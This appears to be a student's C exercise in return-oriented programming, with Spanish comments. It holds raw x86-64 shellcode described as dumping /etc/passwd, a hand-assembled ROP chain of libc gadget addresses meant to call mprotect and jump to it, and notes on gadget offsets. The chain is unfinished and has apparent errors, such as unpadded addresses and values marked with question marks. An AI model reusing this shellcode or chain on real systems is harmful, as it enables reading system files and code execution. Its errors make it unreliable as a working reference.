// Usaremos los gadgets de la debian /lib/x86_64-linux-gnu/libc.so.6

#include <stdio.h>
#include <string.h>

enum{
    Sz = 8 * 1024,
};

char shellcode[Sz] = {
    // your shellcode to dump /etc/passwd
  0x49, 0xb8, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x0f, 0x10,
  0x49, 0xc1, 0xe8, 0x34, 0x4c, 0x29, 0xc4, 0x49, 0xb9, 0x2f,
  0x65, 0x74, 0x63, 0x2f, 0x2f, 0x2f, 0x2f, 0x49, 0xba, 0xff,
  0x2f, 0x70, 0x61, 0x73, 0x73, 0x77, 0x64, 0x49, 0xc1, 0xea,
  0x08, 0x41, 0x52, 0x41, 0x51, 0x48, 0xb8, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0x2f, 0x48, 0xc1, 0xe8, 0x3c, 0x48,
  0x89, 0xe7, 0x48, 0xbe, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0x4f, 0x1a, 0x48, 0xc1, 0xee, 0x34, 0x48, 0x31, 0xd2, 0x0f,
  0x05, 0x49, 0x89, 0xc0, 0x4d, 0x31, 0xd2, 0x4d, 0x39, 0xd0,
  0x7c, 0x66, 0x49, 0xbb, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0x0f, 0x40, 0x49, 0xc1, 0xeb, 0x34, 0x4c, 0x29, 0xdc, 0x48,
  0x31, 0xc0, 0x4c, 0x89, 0xc7, 0x48, 0x89, 0xe6, 0x48, 0xba,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x0f, 0x40, 0x48, 0xc1,
  0xea, 0x34, 0x0f, 0x05, 0x49, 0x89, 0xc1, 0x4d, 0x39, 0xd1,
  0x7c, 0x34, 0x48, 0xb8, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0x1f, 0x48, 0xc1, 0xe8, 0x3c, 0x48, 0x31, 0xff, 0x48,
  0xf7, 0xdf, 0x48, 0x89, 0xe6, 0x4c, 0x89, 0xca, 0x0f, 0x05,
  0x4d, 0x39, 0xd1, 0x77, 0xbe, 0x48, 0xb8, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0x3c, 0x48, 0xc1, 0xe8, 0x38, 0x48,
  0x31, 0xff, 0x0f, 0x05, 0x48, 0xb8, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0x3c, 0x48, 0xc1, 0xe8, 0x38, 0x48, 0x31,
  0xff, 0x48, 0xf7, 0xdf, 0x0f, 0x05

};

char newstack[Sz] = {
    // your ROP chain to execute mprotect and jump to the shellcode

    
    0xa4,0x7c,0x65,0x55,0x55,0x55,  // popq rax 55 55 55 65 7C A4
    0xA,                            // rax = 10
    0x84,0x37,0x6C,0x55,0x55,0x55,  // popq rdi 55 55 55 6C 37 84
                                    // ¿rdi?
    0x0F,0x09,0x58,0x55,0x55,0x55,  // popq rsi 55 55 55 58 09 0F
    0x20,0x00,                      // rsi = ¿8x1024?tamaño shellcode!!!!!!!
    0x06,0xD1,0x55,0x55,0x55,0x55,   // popq rdx 55 55 55 55 D1 06
    0x7,                            // rdx = 7
    0x55,0x55,0x55,0x65,0x0C,0x20   // mprotect
    
    
   //write:
   /*
    0xa4,0x7c,0x65,0x55,0x55,0x55,  // popq rax 55 55 55 65 7C A4
    0x1,                            // rax = 10
    0x84,0x37,0x6C,0x55,0x55,0x55,  // popq rdi 55 55 55 6C 37 84
    0x1,                               // ¿rdi?
    0x0F,0x09,0x58,0x55,0x55,0x55,  // popq rsi 55 55 55 58 09 0F
    0x0a,0x6f,0x68,                      // rsi = ¿8x1024?
    0x06,0xD1,0x55,0x55,0x55,0x55,   // popq rdx 55 55 55 55 D1 06
    0x7,                            // rdx = 7
    0x55,0x55,0x55,0x65,0x0C,0x20   // mprotect
    */
};

int
main(int argc, char** argv)
{
    printf("hi!\n");
    asm(
        "movq %0, %%rsp\n\t"
        "retq\n\t"
        :
        : "r" (newstack)
    );
}

//rsi rax=10 rdi=8x1024 rdx=rwx=7
//rsi rdi 

/*
En gg.txt:

  base = 0x555555558000 == 93824992247808

  0x000ffca4                 58  popq %rax
  0x000ffca5                 c3  retq
  == 93824993295524 == 55 55 55 65 7C A4

  0x0016b784                 5f  popq %rdi
  0x0016b785                 c3  retq
  == 93824993736580 == 55 55 55 6C 37 84

  0x0002890f                 5e  popq %rsi
  0x00028910                 c3  retq
  == 93824992413967 == 55 55 55 58 09 0F

  0x00005106                 5a  pop rdx
  0x00005107                 c3  ret
  == 93824992268550 == 55 55 55 55 D1 06

  mprotect == 55 55 55 65 0C 20


  0x00081ac5                 5c  popq %rsp
  0x00081ac6                 c3  retq

  0x000816c9                 5d  popq %rbp
  0x000816ca                 c3  retq

  */